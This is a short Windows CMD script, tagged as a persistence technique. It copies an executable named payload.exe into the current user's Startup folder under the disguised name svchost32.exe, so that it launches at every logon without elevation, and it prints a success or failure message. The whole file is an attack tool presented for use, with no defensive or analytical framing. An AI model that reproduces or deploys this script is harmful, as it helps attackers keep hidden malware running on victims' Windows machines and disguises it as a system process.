:: lang: CMD | file: startup_folder_persist.cmd | target: Windows 10/11
:: tag: persistence | shell: cmd
:: note: copies payload to user startup folder — no elevation needed

@echo off
set SRC=C:\Users\Public\payload.exe
set DST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost32.exe

copy /y "%SRC%" "%DST%"
if exist "%DST%" (
    echo [+] dropped to startup: %DST%
) else (
    echo [-] copy failed
)
